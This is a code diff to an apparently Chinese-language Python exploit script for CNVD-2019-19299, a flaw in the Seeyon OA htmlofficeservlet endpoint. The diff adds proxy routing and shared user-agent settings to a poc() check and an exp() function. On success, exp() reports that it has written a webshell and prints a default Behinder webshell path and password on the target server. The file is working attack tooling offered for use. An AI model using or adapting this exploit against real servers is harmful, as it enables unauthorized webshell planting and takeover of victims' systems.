@@ -4,9 +4,11 @@
 import sys
 import requests
 import base64
-from Config.config_requests import ua
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+from Config.config_proxies import proxies
+from Config.config_requests import ua
+
+requests.packages.urllib3.disable_warnings()
 # 脚本信息
 ######################################################
 NAME='CNVD-2019-19299'
@@ -19,11 +21,10 @@ def poc(target):
     result = {}
     vuln_url = target + "/seeyon/htmlofficeservlet"
     headers = {
-        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
+        "User-Agent":ua,
     }
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
         if r.status_code==200 and 'htmoffice' in r.text:
             result['target'] = target
             result['poc'] = NAME
@@ -40,8 +41,7 @@ def exp(target):
         "User-Agent": ua,
         "Content-Type": "application/x-www-form-urlencoded",
     }
-    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-    r = requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5)
+    r = requests.post(url=vuln_url,headers=headers,data=data,verify=False,timeout=5,proxies=proxies)
     if r.status_code==500 and '"message":null' in r.text:
         print('[+]成功写入webshell')
         print('[+]默认冰蝎Webshell地址(szxsd):' + target + '/seeyon/Faltform.jsp')
